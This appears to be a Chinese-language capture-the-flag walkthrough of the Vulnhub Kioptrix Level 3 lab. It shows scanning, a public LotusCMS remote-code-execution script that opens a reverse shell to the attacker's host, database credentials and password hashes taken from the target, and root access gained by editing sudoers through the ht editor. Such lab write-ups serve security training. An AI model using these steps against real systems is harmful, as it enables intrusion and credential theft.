# Vulnhub Kioptix Level 3


# Vulnhub-kioptix-Level-1.2（#3）

### 基本信息

kali:192.168.110.10

靶机:192.168.110.25

### 一、信息收集

```
└─# arp-scan --interface=eth1 -l
Interface: eth1, type: EN10MB, MAC: 00:50:56:a3:f5:91, IPv4: 192.168.110.10
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.110.1   00:50:56:a3:2e:39       VMware, Inc.
192.168.110.18  00:50:56:a3:de:c6       VMware, Inc.
192.168.110.19  00:50:56:a3:bd:59       VMware, Inc.
192.168.110.25  00:50:56:a3:ce:34       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.7: 256 hosts scanned in 2.047 seconds (125.06 hosts/sec). 4 responded
```

```
└─# nmap -sV 192.168.110.25
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-02 16:52 CST
Nmap scan report for 192.168.110.25
Host is up (0.00039s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
MAC Address: 00:50:56:A3:CE:34 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.82 seconds
```



```
dirb http://192.168.110.25/
```

```
---- Entering directory: http://192.168.110.25/phpmyadmin/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.110.25/phpmyadmin/lang/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.110.25/phpmyadmin/scripts/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.110.25/phpmyadmin/themes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)
```

`LotusCMS`

```
└─# searchsploit LotusCMS
-------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                        |  Path
-------------------------------------------------------------------------------------- ---------------------------------
LotusCMS 3.0 - 'eval()' Remote Command Execution (Metasploit)                         | php/remote/18565.rb
LotusCMS 3.0.3 - Multiple Vulnerabilities                                             | php/webapps/16982.txt
-------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

### 漏洞利用

```
git clone https://github.com/Hood3dRob1n/LotusCMS-Exploit
```

` ./lotusRCE.sh 192.168.110.25`

```

Path found, now to check for vuln....

</html>Hood3dRob1n
Regex found, site is vulnerable to PHP Code Injection!

About to try and inject reverse shell....
what IP to use?
192.168.110.10
What PORT?
4444

OK, open your local listener and choose the method for back connect:
1) NetCat -e
2) NetCat /dev/tcp
3) NetCat Backpipe
4) NetCat FIFO
5) Exit
#? 1
```



`/home/www/kioptrix3.com/gallery`

'cat gconfig.php'

```
<?php
        error_reporting(0);
        /*
                A sample Gallarific configuration file. You should edit
                the installer details below and save this file as gconfig.php
                Do not modify anything else if you don't know what it is.
        */

        // Installer Details -----------------------------------------------

        // Enter the full HTTP path to your Gallarific folder below,
        // such as http://www.yoursite.com/gallery
        // Do NOT include a trailing forward slash

        $GLOBALS["gallarific_path"] = "http://kioptrix3.com/gallery";

        $GLOBALS["gallarific_mysql_server"] = "localhost";
        $GLOBALS["gallarific_mysql_database"] = "gallery";
        $GLOBALS["gallarific_mysql_username"] = "root";
        $GLOBALS["gallarific_mysql_password"] = "fuckeyou";

        // Setting Details -------------------------------------------------

if(!$g_mysql_c = @mysql_connect($GLOBALS["gallarific_mysql_server"], $GLOBALS["gallarific_mysql_username"], $GLOBALS["gallarific_mysql_password"])) {
                echo("A connection to the database couldn't be established: " . mysql_error());
                die();
}else {
        if(!$g_mysql_d = @mysql_select_db($GLOBALS["gallarific_mysql_database"], $g_mysql_c)) {
                echo("The Gallarific database couldn't be opened: " . mysql_error());
                die();
        }else {
                $settings=mysql_query("select * from gallarific_settings");
                if(mysql_num_rows($settings)!=0){
                        while($data=mysql_fetch_array($settings)){
                                $GLOBALS["{$data['settings_name']}"]=$data['settings_value'];
                        }
                }

        }
}

?>
```

```
http://192.168.110.25/index.php?system=Admin
```

![](/Vulnhub-kioptix-Level-1.3/1.JPG)

```
dreg            0d3eccfb887aabd50f243b3f155c0f85     Mast3r
loneferret      5badcaf789d3d1d09794d8f021f40f0e     starwars
```

第一个发现没啥可用的

第二个发现可以执行ht

```
loneferret@Kioptrix3:~$ sudo -l
User loneferret may run the following commands on this host:
    (root) NOPASSWD: !/usr/bin/su
    (root) NOPASSWD: /usr/local/bin/ht
```

`export TERM=xterm`

`sudo ht`

按F3按键，打开/etc/sudoers

```
│# /etc/sudoers
 #
 # This file MUST be edited with the 'visudo' command as root.
 #
 # See the man page for details on how to write a sudoers file.
 #

 Defaults        env_reset

 # Host alias specification

 # User alias specification

 # Cmnd alias specification

 # User privilege specification
 root    ALL=(ALL) ALL
 loneferret ALL=NOPASSWD: !/usr/bin/su, /usr/local/bin/ht,/bin/bash

 # Uncomment to allow members of group sudo to not need a password
 # (Note that later entries override this, so you might need to move
 # it further down)
 # %sudo ALL=NOPASSWD: ALL

 # Members of the admin group may gain root privileges
 %admin ALL=(ALL) ALL
```

使用sudo执行/bin/bash，成功提权到root

![]()![2](/Vulnhub-kioptix-Level-1.3/2.JPG)
